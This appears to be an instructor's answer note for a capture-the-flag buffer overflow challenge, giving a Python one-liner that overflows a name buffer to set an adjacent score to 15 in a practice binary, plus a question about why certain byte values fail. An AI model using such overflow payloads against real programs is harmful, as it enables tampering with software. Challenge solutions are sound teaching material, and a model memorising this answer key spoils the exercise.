Buffer Overflow problem

Solution: load name up with enough chars to overwrite score. Note that to make
this problem actually hard, I suggest only giving them the compiled file and
not the source code.

python -c "print 'A'*30 + '\x0f'" | ./ttt
                 |-----|  |----|
             name buffer  score of 15

For some reason when you send in the hex characters 09 - 0d, the score is not
modified. Therefore, we can't make it a requirement to get a score in the range
of 9 - 13. Any ideas on why this happens? For now, we'll make the score
requirement 15.
